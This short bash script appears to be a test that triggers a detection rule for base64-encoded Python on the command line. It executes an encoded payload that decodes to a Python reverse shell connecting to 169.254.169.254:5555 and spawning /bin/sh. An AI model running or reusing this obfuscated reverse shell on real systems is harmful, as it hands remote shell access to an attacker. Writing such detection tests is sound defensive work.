#!/bin/bash

echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92mThis rule detects base64-encoded Python scripts on command line arguments. Base64 can be used to encode binary data for transfer to ASCII-only command lines. Attackers can leverage this technique in various exploits to load shellcode and evade detection.\033[m"

python3 -c "
import base64
try:
    exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3Muc2V0dGltZW91dCgxKTtzLmNvbm5lY3QoKCIxNjkuMjU0LjE2OS4yNTQiLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi0iXSk7').decode())
except Exception:
    pass
"
